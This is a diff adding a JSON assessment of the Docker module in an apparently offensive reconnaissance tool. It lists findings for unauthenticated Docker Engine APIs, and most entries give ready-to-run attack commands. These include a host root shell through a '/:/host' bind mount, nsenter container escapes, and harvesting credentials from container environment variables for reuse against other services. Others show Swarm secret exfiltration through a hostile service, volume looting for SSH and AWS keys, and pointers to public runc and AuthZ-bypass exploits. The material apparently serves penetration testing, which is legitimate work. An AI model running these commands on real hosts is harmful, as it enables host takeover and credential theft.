@@ -1,0 +1,121 @@
+{
+  "service": "docker",
+  "summary": "Very mature module: unauthenticated Docker Engine API read produces per-container escape enablers, env-secret extraction, Swarm secret/config names, and version-gated engine + runc CVEs. Reads deep (inspect every container) but explicitly avoids the container-create RCE. Biggest gap: no automated proof of the escape (spawning a canary alpine container mounting /host and reading a benign file back), and no attempt to reuse discovered env secrets against any second service.",
+  "module_files": [
+    "/home/kali/Desktop/projects/recce/recce/services/docker.py"
+  ],
+  "findings": [
+    {
+      "kind": "docker_api",
+      "title_pattern": "Docker Engine API exposed without authentication",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "Anon GET /version + /info returning 200 JSON is deterministic proof the daemon is unauth-exposed; the RCE path is documented but never launched.",
+      "can_promote_to": "t2",
+      "promotion_notes": "POST /containers/create with a benign image bind-mounting /:/host readonly, /containers/{id}/start, /containers/{id}/exec with 'id;hostname;cat /etc/hostname' \u2014 capture output as proof of root-on-host without persisting anything. Delete container on teardown.",
+      "promotion_risk": "high",
+      "tester_next_step": "docker -H http://<ip>:2375 run --rm -v /:/host -it alpine chroot /host sh \u2014 root shell on host. Or curl -s http://<ip>:2375/containers/json to enumerate then POST /containers/create with a bind for a full escape.",
+      "related_cves": []
+    },
+    {
+      "kind": "docker_secrets",
+      "title_pattern": "Docker container/image inventory readable unauthenticated",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "GET /containers/json + /images/json returning 200 lists is direct proof of unauth workload disclosure.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Iterate containers, `docker inspect` env, docker cp /root/.aws /tmp, then reuse extracted AWS keys against sts:GetCallerIdentity. Already partly done in docker_env_secrets.",
+      "promotion_risk": "low",
+      "tester_next_step": "docker -H http://<ip>:2375 ps -a; docker -H ... inspect <id> | jq '.[].Config.Env' \u2014 mine every env for creds and mounted volumes for known secret paths (~/.aws, ~/.kube, ~/.ssh)."
+    },
+    {
+      "kind": "docker_env_secrets",
+      "title_pattern": "Docker container env-var credentials readable unauthenticated",
+      "severity": "high",
+      "tier": "t3",
+      "tier_evidence": "Actual credential-shaped env values are read out of /containers/{id}/json Config.Env and returned as loot with preview \u2014 ready-to-reuse credentials in hand.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Feed extracted DB URIs into the db/* modules (mongodb, postgres, mysql, redis) \u2014 already-scanned targets; feed AWS keys into a cloud metadata dance. Wire into shared known_users / known_creds pool.",
+      "promotion_risk": "low",
+      "tester_next_step": "docker -H http://<ip>:2375 inspect $(docker -H ... ps -q) | jq -r '.[].Config.Env[]' | grep -Ei 'PASS|KEY|TOKEN|URL' \u2014 try each credential against services on the same host or reachable ranges."
+    },
+    {
+      "kind": "docker_host_escape",
+      "title_pattern": "Docker containers with host-mount / privileged escape route",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "Enumerated from HostConfig via unauth inspect \u2014 the presence of /:/host bind or Privileged=true is deterministic evidence a container is an escape primitive.",
+      "can_promote_to": "t2",
+      "promotion_notes": "docker exec into an existing privileged container and read a canary file on the host \u2014 no need to spawn one. Non-destructive proof.",
+      "promotion_risk": "medium",
+      "tester_next_step": "docker -H ... exec -it <priv_container_id> nsenter -t 1 -m -u -i -n -p sh \u2014 full host root via existing container; or chroot /host if a /:/host bind exists."
+    },
+    {
+      "kind": "docker_ns_escape",
+      "title_pattern": "Docker containers with namespace / capability escape enablers",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "Namespace/cap/secopt/device settings pulled from inspect are self-declared proof of the escape primitive, but recce doesn't attempt the escape itself.",
+      "can_promote_to": "t2",
+      "promotion_notes": "docker exec into a SYS_ADMIN or PID=host container and use nsenter/mount to read a host file. Or exec into an apparmor=unconfined container and issue a mount() syscall to prove the sandbox is off.",
+      "promotion_risk": "medium",
+      "tester_next_step": "docker -H ... exec <container_id> nsenter -t 1 -m -u -i -n -p /bin/sh \u2014 if PidMode=host or SYS_ADMIN present. For seccomp=unconfined: docker exec <c> unshare -Ur sh \u2014 check for CAP_SYS_ADMIN behaviors."
+    },
+    {
+      "kind": "docker_engine_cve",
+      "title_pattern": "Docker Engine CVE-2024-41110 (Docker Engine AuthZ plugin bypass)",
+      "severity": "critical",
+      "tier": "t0",
+      "tier_evidence": "Emitted from ServerVersion string alone \u2014 pure version-range banner match, no probe of the CVE itself.",
+      "can_promote_to": "t1",
+      "promotion_notes": "For CVE-2024-41110: craft the AuthZ-bypass request (empty body + Content-Length: 0) against a policy-restricted endpoint and observe it succeeds \u2014 requires an AuthZ plugin to be present, which is not directly detectable here.",
+      "promotion_risk": "medium",
+      "tester_next_step": "docker -H <sch>://<ip>:2375 version; if ServerVersion < 23.0.14 / 26.1.4 / 27.1.0 and daemon has an authz plugin, PoC at https://github.com/AbsoZed/CVE-2024-41110 sends header-only requests to bypass plugin checks.",
+      "related_cves": [
+        "CVE-2024-41110"
+      ]
+    },
+    {
+      "kind": "docker_runc_cve",
+      "title_pattern": "runc CVE-2024-21626 / CVE-2019-5736",
+      "severity": "critical",
+      "tier": "t0",
+      "tier_evidence": "Version-range match against RuncCommit.ID only \u2014 no probe of the escape itself.",
+      "can_promote_to": "t1",
+      "promotion_notes": "CVE-2019-5736: attempt a controlled 'runc exec' into a container that writes to /proc/self/exe (dangerous, will overwrite the host runc). Not appropriate as automated probe.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "docker -H http://<ip>:2375 info --format '{{.RuncCommit.ID}}'; for CVE-2024-21626 PoC see leaked-fd escape at https://github.com/NitroCao/CVE-2024-21626 \u2014 run only in ROE, has host-corruption side-effects.",
+      "related_cves": [
+        "CVE-2024-21626",
+        "CVE-2019-5736"
+      ]
+    },
+    {
+      "kind": "docker_swarm_secrets",
+      "title_pattern": "Docker Swarm secrets/configs enumerated unauth",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "GET /secrets and /configs returning names is deterministic proof of Swarm manager exposure; values are not retrieved (they require a task mount).",
+      "can_promote_to": "t3",
+      "promotion_notes": "POST /services/create with a hostile task that mounts the named secrets and exfiltrates them (e.g., writes to a bind-mount or does a callback). Destructive on the cluster.",
+      "promotion_risk": "high",
+      "tester_next_step": "docker -H ... secret ls; docker -H ... service create --name pwn --secret db_password alpine sleep 3600; then docker -H ... exec pwn cat /run/secrets/db_password to exfiltrate."
+    },
+    {
+      "kind": "docker_volumes",
+      "title_pattern": "Docker volume inventory readable",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "Just names from /volumes \u2014 attack-surface data, no vuln evidence.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Bind a volume into a probe container and search for known credential paths (.aws/credentials, id_rsa) \u2014 but requires container-create.",
+      "promotion_risk": "medium",
+      "tester_next_step": "docker -H ... volume ls; docker -H ... run --rm -v <vol>:/loot alpine find /loot -type f \u2014 look for id_rsa, credentials, .env."
+    }
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_creds (feed env_secrets into it)",
+    "known_hosts (leak from swarm services)",
+    "known_users (from container commands / images naming)"
+  ]
+}
